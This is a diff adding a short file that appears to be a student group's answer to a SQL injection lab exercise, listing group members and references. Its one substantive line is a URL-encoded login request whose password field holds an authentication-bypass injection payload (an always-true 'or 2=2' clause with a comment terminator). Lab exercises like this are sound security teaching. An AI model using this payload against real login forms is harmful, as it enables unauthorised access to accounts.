@@ -1,0 +1,7 @@
+sql_1.txt
+
+Group members: Trent Chrismar, Ryan Brockway, Joshua Cominelli
+References: w3schools.com, unixwiz.net 
+
+username=victim&password=%5C%27%20or%202%3D2%3B%20--%20
+
